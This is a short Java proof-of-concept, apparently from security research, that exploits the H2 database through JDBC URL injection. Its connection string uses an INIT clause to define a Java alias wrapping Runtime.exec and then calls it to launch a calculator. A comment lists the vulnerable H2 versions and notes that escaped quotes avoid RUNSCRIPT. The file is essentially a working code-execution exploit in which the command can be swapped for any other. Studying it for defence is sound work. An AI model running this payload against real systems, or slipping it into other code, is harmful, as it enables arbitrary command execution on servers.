package com.example.h2attack;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * 将引号转义就可以不用 RUNSCRIPT
 *
 * version
 * com.h2database:h2
 * [1.3.x, 1.4.x, 2.0.x, 2.1.x, 2.2.x]
 * [1.2.130, 1.2.147]
 *
 * @author Whoopsunix
 */
public class Offline {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String attackUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('open -a calculator.app')\\;";
        Connection connection = DriverManager.getConnection(attackUrl);
    }
}
